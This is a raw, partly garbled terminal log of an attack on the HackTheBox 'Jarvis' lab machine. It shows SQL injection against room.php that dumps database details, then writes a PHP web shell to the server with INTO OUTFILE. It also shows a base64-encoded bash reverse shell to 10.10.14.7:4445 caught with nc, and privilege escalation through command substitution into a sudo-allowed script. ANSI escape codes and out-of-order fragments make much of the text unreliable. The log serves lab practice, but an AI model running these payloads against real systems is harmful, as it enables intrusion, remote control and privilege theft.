+grep -nE 'room.php|price-room' loot/room_cod_false.html | head -5[K[A[12D[32mc[32mu[32mr[32ml[39m[52C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m?[33mc[33mo[33md[33m=[33m1[33m%[33m2[33m0[33mA[33mN[33mD[33m%[33m2[33m0[33m1[33m=[33m2[33m"[39m[1B[32mg[32mr[32me[32mp[39m[5C[33m'[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m|[33mp[33mr[33mi[33mc[33me[33m-[33mr[33mo[33mo[33mm[33m'[39m[28C[32mh[32me[32ma[32md[39m[3C[?1l>[?2004l
+HTTP/1.1 200 OK
+Date: Fri, 04 Sep 2026 09:08:40 GMT
+Server: Apache/2.4.25 (Debian)
+Set-Cookie: PHPSESSID=2fi07d8mcpkre5a5l0qqfvm6f2; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+IronWAF: 2.0.3
+Content-Length: 5916
+Content-Type: text/html; charset=UTF-8
+
+109:							<h3><a href="/room.php?cod="></a></h3>
+112:								<span class="price-room"></span>
+[
+$ [10:11:07] curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,2,3,4,5,6,7-- -" -o loot/room_union7_false.html
+sed -n '104,118p' loot/room_union7_false.html
+1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:08:41][39m $ [K[?1h=[?2004hcurl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,2,3,4,5,6,7-- -" -o loot/room_union7_false.html
+sed -n '104,118p' loot/room_union7_false.html[K[A[8C[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mo[33md[33m=[33m-[33m1[33m [33mU[33mN[33mI[33mO[33mN[33m [33mS[33mE[33mL[33mE[33mC[33mT[33m [33m1[33m,[33m2[33m,[33m3[33m,[33m4[33m,[33m5[33m,[33m6[33m,[33m7[33m-[33m-[33m [33m-[33m"[39m[1B[32ms[32me[32md[39m[4C[33m'[33m1[33m0[33m4[33m,[33m1[33m1[33m8[33mp[33m'[39m[28C[?1l>[?2004l
+				<div class="row">
+					<div class="col-md-4 room-wrap animate-box">
+						<a href="/images/6" class="room image-popup-link" style="background-image: url(/images/6);"></a>
+						<div class="desc text-center">
+							<span class="rate-star">5</span>
+							<h3><a href="/room.php?cod=1">2</a></h3>
+							<p class="price">
+								<span class="currency">$</span>
+								<span class="price-room">3</span>
+								<span class="per">/ per night</span>
+							</p>
+							<p>4</p>
+							<p><a class="btn btn-primary">Go to book!</a></p>
+						</div>
+					</div>	<footer id="colorlib-footer" role="contentinfo">
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:11:07][39m $ [K[?1h=[?2004hcurl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,@@version,3,4,5,6,7-- -" | grep -nE '<h3>'
+curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,database(),3,4,5,6,7-- -" | grep -nE '<h3>'[K
+curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -" | grep -nE '<h3>'[K[A[A[156D[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mo[33md[33m=[33m-[33m1[33m [33mU[33mN[33mI[33mO[33mN[33m [33mS[33mE[33mL[33mE[33mC[33mT[33m [33m1[33m,[33m@[33m@[33mv[33me[33mr[33ms[33mi[33mo[33mn[33m,[33m3[33m,[33m4[33m,[33m5[33m,[33m6[33m,[33m7[33m-[33m-[33m [33m-[33m"[39m[3C[32mg[32mr[32me[32mp[39m[5C[33m'[33m<[33mh[33m3[33m>[33m'[39m[1B[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mo[33md[33m=[33m-[33m1[33m [33mU[33mN[33mI[33mO[33mN[33m [33mS[33mE[33mL[33mE[33mC[33mT[33m [33m1[33m,[33md[33ma[33mt[33ma[33mb[33ma[33ms[33me[33m([33m)[33m,[33m3[33m,[33m4[33m,[33m5[33m,[33m6[33m,[33m7[33m-[33m-[33m [33m-[33m"[39m[3C[32mg[32mr[32me[32mp[39m[5C[33m'[33m<[33mh[33m3[33m>[33m'[39m[1B[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mo[33md[33m=[33m-[33m1[33m [33mU[33mN[33mI[33mO[33mN[33m [33mS[33mE[33mL[33mE[33mC[33mT[33m [33m1[33m
+$ [10:13:47] curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,@@version,3,4,5,6,7-- -" | grep -nE '<h3>'
+curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,database(),3,4,5,6,7-- -" | grep -nE '<h3>'
+curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -" | grep -nE '<h3>'
 
-=== SESSION RECONNECT: 2026-09-03 22:59:42 ===
+$ [10:16:17] curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,user(),3,@@secure_file_priv,5,6,7-- -" | sed -n '104,118p'
+,[33mG[33mR[33mO[33mU[33mP[33m_[33mC[33mO[33mN[33mC[33mA[33mT[33m([33mt[33ma[33mb[33ml[33me[33m_[33mn[33ma[33mm[33me[33m)[33m,[33m3[33m,[33m4[33m,[33m5[33m,[33m6[33m,[33m7[33m [33mF[33mR[33mO[33mM[33m [33mi[33mn[33mf[33mo[33mr[33mm[33ma[33mt[33mi[33mo[33mn[33m_[33ms[33mc[33mh[33me[33mm[33ma[33m.[33mt[33ma[33mb[33ml[33me[33ms[33m [33mW[33mH[33mE[33mR[33mE[33m [33mt[33ma[33mb[33ml[33me[33m_[33ms[33mc[33mh[33me[33mm[33ma[33m=[33md[33ma[33mt[33ma[33mb[33ma[33ms[33me[33m([33m)[33m-[33m-[33m [33m-[33m"[39m[3C[32mg[32mr[32me[32mp[39m[5C[33m'[33m<[33mh[33m3[33m>[33m'[39m[?1l>[?2004l
+109:							<h3><a href="/room.php?cod=1">10.1.48-MariaDB-0+deb9u2</a></h3>
+109:							<h3><a href="/room.php?cod=1">hotel</a></h3>
+109:							<h3><a href="/room.php?cod=1">room</a></h3>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:13:47][39m $ [K[?1h=[?2004hcurl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,user(),3,@@secure_file_priv,5,6,7-- -" | sed -n '104,118p'[135D[32mc[32mu[32mr[32ml[39m[8C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mo[33md[33m=[33m-[33m1[33m [33mU[33mN[33mI[33mO[33mN[33m [33mS[33mE[33mL[33mE[33mC[33mT[33m [33m1[33m,[33mu[33ms[33me[33mr[33m([33m)[33m,[33m3[33m,[33m@[33m@[33ms[33me[33mc[33mu[33mr[33me[33m_[33mf[33mi[33ml[33me[33m_[33mp[33mr[33mi[33mv[33m,[33m5[33m,[33m6[33m,[33m7[33m-[33m-[33m [33m-[33m"[39m[3C[32ms[32me[32md[39m[4C[33m'[33m1[33m0[33m4[33m,[33m1[33m1[33m8[33mp[33m'[39m[?1l>[?2004l
+				<div class="row">
+					<div class="col-md-4 room-wrap animate-box">
+						<a href="/images/6" class="room image-popup-link" style="background-image: url(/images/6);"></a>
+						<div class="desc text-center">
+							<span class="rate-star">5</span>
+							<h3><a href="/room.php?cod=1">DBadmin@localhost</a></h3>
+							<p class="price">
+								<span class="currency">$</span>
+								<span class="price-room">3</span>
+								<span class="per">/ per night</span>
+							</p>
+							<p></p>
+							<p><a class="btn btn-primary">Go to book!</a></p>
+						</div>
+					</div>	<footer id="colorlib-footer" role="contentinfo">
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:16:17][39m $ [K[?1h=[?2004hcurl -sS -G "http://$BoxIP/room.php" \
+  --data-urlencode "cod=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'-- -" \[K
+  -o $BoxDir/loot/sqli_outfile.html[K[A[A[18C[32mc[32mu[32mr[32ml[39m[8C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m"[39m[1B[70D[33m"[33mc[33mo[33md[33m=[33m-[33m1[33m [33mU[33mN[33mI[33mO[33mN[33m [33mS[33mE[33mL[33mE[33mC[33mT[33m [33m1[33m,[33m0[33mx[33m3[33mc[33m3[33mf[33m7[33m0[33m6[33m8[33m7[33m0[33m2[33m0[33m7[33m3[33m7[33m9[33m7[33m3[33m7[33m4[33m6[33m5[33m6[33md[33m2[33m8[33m2[33m4[33m5[33mf[33m4[33m7[33m4[33m5[33m5[33m4[33m5[33mb[33m2[33m2[33m6[33m3[33m6[33md[33m6[33m4[33m2[33m2[33m5[33md[33m2[33m9[33m3[33mb[33m2[33m0[33m3[33mf[33m3[33me[33m,[33m3[33m,[33
+$ [10:18:28] curl -sS -G "http://$BoxIP/room.php" \
+  --data-urlencode "cod=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'-- -" \
+  -o $BoxDir/loot/sqli_outfile.html
 
-=== SESSION RECONNECT: 2026-09-03 22:59:52 ===
+$ [10:18:35] curl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=id" | tee $BoxDir/loot/shell_id.txt
 
-=== SESSION RECONNECT: 2026-09-03 22:59:59 ===
+$ [10:19:46] boxset Username www-data
 
-=== SESSION RECONNECT: 2026-09-03 23:00:46 ===
+=== SESSION RECONNECT: 2026-09-04 10:19:59 ===
 
-=== SESSION RECONNECT: 2026-09-03 23:00:55 ===
+$ [10:20:03] htblog
 
-=== SESSION RECONNECT: 2026-09-03 23:01:35 ===
+=== OUTPUT CAPTURE START: 2026-09-04 10:20:03 ===
 
-=== SESSION RECONNECT: 2026-09-03 23:04:57 ===
+$ [10:20:10] nc -lvnp 4445
 
-=== SESSION RECONNECT: 2026-09-03 23:05:14 ===
+$ [10:20:20] curl -sS --max-time 15 -G "http://$BoxIP/shell.php" \
+  --data-urlencode "cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDUgMD4mMQ== | base64 -d > /tmp/rev.sh; chmod +x /tmp/rev.sh" \
+  -o $BoxDir/loot/stage_rev_shell.txt
+m4[33m,[33m5[33m,[33m6[33m,[33m7[33m [33mI[33mN[33mT[33mO[33m [33mO[33mU[33mT[33mF[33mI[33mL[33mE[33m [33m'[33m/[33mv[33ma[33mr[33m/[33mw[33mw[33mw[33m/[33mh[33mt[33mm[33ml[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m'[33m-[33m-[33m [33m-[33m"[39m[1B[123D[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:18:28][39m $ [K[?1h=[?2004hcurl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=id" | tee $BoxDir/loot/shell_id.txt[95D[32mc[32mu[32mr[32ml[39m[8C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mm[33md[33m=[33mi[33md[33m"[39m[3C[32mt[32me[32me[39m[26C[?1l>[?2004l
+1	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	3	4	5	6	7
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:18:35][39m $ [K[?1h=[?2004hboxset Username www-data[24D[32mb[32mo[32mx[32ms[32me[32mt[39m[18C[?1l>[?2004l
+[+] Username=www-data (saved to .env)
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:19:46][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:19:59][39m $ curl -sS --max-time 15 -G "http://$BoxIP/shell.php" \
+  --data-urlencode "cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDUgMD4mMQ== | base64 -d > /tmp/rev.sh; chmod +x /tmp/rev.sh" \[K
+  -o $BoxDir/loot/stage_rev_shell.txt[K[3A[16C[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[1B[85D[33m"[33mc[33mm[33md[33m=[33me[33mc[33mh[33mo[33m [33mY[33mm[33mF[33mz[33ma[33mC[33mA[33mt[33ma[33mS[33mA[33m+[33mJ[33mi[33mA[33mv[33mZ[33mG[33mV[33m2[33mL[33m3[33mR[33mj[33mc[33mC[33m8[33mx[33mM[33mC[33m4[33mx[33mM[33mC[33m4[33mx[33mN[33mC[33m4[33m3[33mL[33mz[33mQ[33m0[33mN[33mD[33mU[33mg[33mM[33mD[33m4[33mm[33mM[33mQ[33m=[33m=[33m [33m|[33m [33mb[33ma[33ms[33me[33m6[33m4[33m [33m-[33md[33m [33m>[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m.[33ms[33mh[33m;[33m [33mc[33mh[33mm[33mo[33md[33m [33m+[33mx[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m.[33ms[33mh[33m"[39m[1B[21C[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:20:20][39m $ [K[?1h=[?2004hcurl -sS --max-time 10 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=ls -l /tmp/rev.sh" | tee $BoxDir/loot/stage_rev_shell_check.txt[K[A[19D[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[1B[100D[33m"[33mc[33mm[33md[33m=[33ml[33ms[33m [33m-[33ml[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m.[33ms[3
+$ [10:20:27] curl -sS --max-time 10 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=ls -l /tmp/rev.sh" | tee $BoxDir/loot/stage_rev_shell_check.txt
+
+$ [10:21:02] curl -sS --max-time 5 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=bash /tmp/rev.sh" &
+
+$ [10:22:25] stty raw -echo; fg
+Script started on 2026-09-04 10:20:03+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="117" LINES="53"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:20:03][39m $ [K[?1h=[?2004hn[4mn[24m[4mn[4mc[24m[24m[32mn[24m[32mc[39m[32mn[32mc[32m [39m[32mn[32mc[39m[39m -lvnp 4445[?1l>[?2004l
+Listening on 0.0.0.0 4445
+Connection received on 10.129.1.73 52698
+bash: cannot set terminal process group (544): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@jarvis:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@jarvis:/var/www/html$ ^Z
+zsh: suspended  nc -lvnp 4445
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:22:18][39m $ [K[?1h=[?2004hstty raw -echo; fg[18D[32ms[32mt[32mt[32my[39m[12C[32mf[32mg[39m[?1l>[?2004l
+[1]  + continued  nc -lvnp 4445
+
+www-data@jarvis:/var/www/html$ export TERM=xterm
+www-data@jarvis:/var/www/html$ whoami && id && hostname && ip a
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+jarvis
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether a2:de:ad:ae:2e:97 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.1.73/16 brd 10.129.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::a0de:adff:feae:2e97/64 scope global mngtmpaddr dynamic 
+       valid_lft 86396sec preferred_lft 14396sec
+    inet6 fe80::a0de:adff:feae:2e97/64 scope link 
+       valid_lft forever preferred_lft forever
+www-data@jarvis:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+www-data@jarvis:/var/www/html$ cat /var/www/Admin-Utilities/simpler.py
+#!/usr/bin/env python3
+from datetime import datetime
+import sys
+import os
+from os import listdir
+import re
+
+def show_help():
+    message='''
+********************************************************
+* Simpler   -   A simple simplifier ;)                 *
+* Version 1.0                                          *
+********************************************************
+Usage:  python3 simpler.py [options]
+
+Options:
+    -h/--help   : This help
+    -s          : Statistics
+    -l          : List the attackers IP
+    -p          : ping an attacker IP
+    '''
+    print(message)
+
+def show_header():
+    print('''***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+''')
+
+def show_statistics():
+    path = '/home/pepper/Web/Logs/'
+    print('Statistics\n-----------')
+    listed_files = listdir(path)
+    count = len(listed_files)
+    print('Number of Attackers: ' + str(count))
+    level_1 = 0
+    dat = datetime(1, 1, 1)
+    ip_list = []
+    reks = []
+  
+=== SESSION RECONNECT: 2026-09-04 10:29:23 ===
+
+$ [10:29:26] htblog
+
+=== OUTPUT CAPTURE START: 2026-09-04 10:29:26 ===
+
+$ [10:29:36] nc -lvnp 4444
+  ip = ''
+    req = ''
+    rek = ''
+    for i in listed_files:
+        f = open(path + i, 'r')
+        lines = f.readlines()
+        level2, rek = get_max_level(lines)
+        fecha, requ = date_to_num(lines)
+        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if fecha > dat:
+            dat = fecha
+            req = requ
+            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if int(level2) > int(level_1):
+            level_1 = level2
+            ip_list = [ip]
+            reks=[rek]
+        elif int(level2) == int(level_1):
+            ip_list.append(ip)
+            reks.append(rek)
+        f.close()
+	
+    print('Most Risky:')
+    if len(ip_list) > 1:
+        print('More than 1 ip found')
+    cont = 0
+    for i in ip_list:
+        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
+        cont = cont + 1
+	
+    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
+	
+def list_ip():
+    print('Attackers\n-----------')
+    path = '/home/pepper/Web/Logs/'
+    listed_files = listdir(path)
+    for i in listed_files:
+        f = open(path + i,'r')
+        lines = f.readlines()
+        level,req = get_max_level(lines)
+        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
+        f.close()
+
+def date_to_num(lines):
+    dat = datetime(1,1,1)
+    ip = ''
+    req=''
+    for i in lines:
+        if 'Level' in i:
+            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
+            regex = '(\d+)-(.*)-(\d+)(.*)'
+            logEx=re.match(regex, fecha).groups()
+            mes = to_dict(logEx[1])
+            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
+            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
+            if fecha > dat:
+                dat = fecha
+                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
+    return dat, req
+			
+def to_dict(name):
+    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
+    return month_dict[name]
+	
+def get_max_level(lines):
+    level=0
+    for j in lines:
+        if 'Level' in j:
+            if int(j.split(' ')[4]) > int(level):
+                level = j.split(' ')[4]
+                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
+    return level, req
+	
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+
+if __name__ == '__main__':
+    show_header()
+    if len(sys.argv) != 2:
+        show_help()
+        exit()
+    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+        show_help()
+        exit()
+    elif sys.argv[1] == '-s':
+        show_statistics()
+        exit()
+    elif sys.argv[1] == '-l':
+        list_ip()
+        exit()
+    elif sys.argv[1] == '-p':
+        exec_ping()
+        exit()
+    else:
+        show_help()
+        exit()
+www-data@jarvis:/var/www/html$ printf '%s\n' '127.0.0.1$(bash /tmp/rev.sh)' | suddo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: ^C
+
+
+
+127.0.0.1$(bash /tmp/rev.sh)
+^C^C^C^C^C^C^C^C
+exit
+exit
+quit
+clear
+
+Script done on 2026-09-04 10:33:33+01:00 [COMMAND_EXIT_CODE="0"]
+
+=== SESSION RECONNECT: 2026-09-04 10:33:35 ===
+
+$ [10:33:39] htblog
+
+=== OUTPUT CAPTURE START: 2026-09-04 10:33:39 ===
+
+$ [10:33:56] nc -lvnp 4445
+
+$ [10:34:03] curl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=echo 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1' > /tmp/rev2.sh; chmod +x /tmp/rev2.sh"
+
+$ [10:34:10] curl -sS --max-time 10 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=printf '%s\n' '127.0.0.1\$(bash /tmp/rev2.sh)' | sudo -u pepper /var/www/Admin-Utilities/simpler.py -p" &
+3mh[33m"[39m[3C[32mt[32me[32me[39m[39C[?1l>[?2004l
+1	-rwxr-xr-x 1 www-data www-data 40 Sep  4 05:20 /tmp/rev.sh
+	3	4	5	6	7
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:20:27][39m $ [K[?1h=[?2004hcurl -sS --max-time 5 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=bash /tmp/rev.sh" &[K[A[26C[32mc[32mu[32mr[32ml[39m[21C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[1B[100D[33m"[33mc[33mm[33md[33m=[33mb[33ma[33ms[33mh[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m.[33ms[33mh[33m"[39m[2C[?1l>[?2004l
+[1] 832015
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:21:02][39m $ [K[?1h=[?2004hcurl: (28) Operation timed out after 5004 milliseconds with 0 bytes received
+
+[1]  + exit 28    curl -sS --max-time 5 -G "http://$BoxIP/shell.php" --data-urlencode 
+[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:21:07][39m $ [Kcurl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=echo 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1' > /tmp/rev2.sh; chmod +x /tmp/rev2.sh"[K[A[27D[32mc[32mu[32mr[32ml[39m[8C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[18C[33m"[33mc[33mm[33md[33m=[33me[33mc[33mh[33mo[33m [33m'[33mb[33ma[33ms[33mh[33m [33m-[33mi[33m [33m>[33m&[33m [33m/[33md[33me[33mv[33m/[33mt[33mc[33mp[33m/[36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m/[36m$[36mP[36mo[36mr[36mt[39m[33m [33m0[33m>[33m&[33m1[33m'[33m [33m>[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m2[33m.[33ms[33mh[33m;[33m [33mc[33mh[33mm[33mo[33md[33m [33m+[33mx[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m2[33m.[33ms[33mh[33m"[39m[?1l>[?2004l
+1		3	4	5	6	7
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:34:03][39m $ [K[?1h=[?2004hcurl -sS --max-time 10 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=printf '%s\n' '127.0.0.1\$(bash /tmp/rev2.sh)' | sudo -u pepper /var/www/Admin-Utilities/simpler.py -p" &[K[A[61D[32mc[32mu[32mr[32ml[39m[22C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[1B[100D[33m"[33mc[33mm[33md[33m=[33mp[33mr[33mi[33mn[33mt[33mf[33m [33m'[33m%[33ms[33m\[33mn[33m'[33m [33m'[33m1[33m2[33m7[33m.[33m0[33m.[33m0[33m.[33m1[36m\[36m$[39m[33m([33mb[33ma[33ms[33mh[33m [33m/[33mt[33mm[33mp[33m/[33mr[33me[33mv[33m2[33m.[33ms[33mh[33m)[33m'[33m [33m|[33m [33ms[33mu[33md[33mo[33m [33m-[33mu[33m [33mp[33me[33mp[33mp[33me[33mr[33m 